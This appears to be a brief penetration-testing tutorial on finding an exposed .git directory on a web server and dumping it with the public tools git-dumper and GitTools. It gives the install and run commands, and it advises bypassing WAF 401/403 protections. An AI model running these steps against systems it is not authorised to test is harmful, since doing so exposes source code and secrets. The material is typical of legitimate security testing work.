1. Find the `.git` directory, you have to bypass any access protections such as WAF (bypass 401 and 403 status codes).
2. Once found, there are many tools to dump the data and my favorite two are the following:

# First Tool - Git Dumper:
1. Run the command: `git clone https://github.com/arthaud/git-dumper` to download the tool from GitHub.
2. Go inside the direcotry using `cd git-dumper`.
3. run `pip install -r requirements.txt` to intsall all needed packages.
4. Run the command `python git_dumper.py http://webapp.com/.git/ ./output ` to use the tool.

# Second Tool - Git Tools:
1. Run the command: `git clone https://github.com/internetwache/GitTools` to download the tool from GitHub.
2. Go inside the direcotry using `cd GitTools`.
3. This tool has three features: Finder, Dumper, and Extractor. You use the first one to find a git folder, then the second one to download all of its contents, and the third feature to make the contents readable.
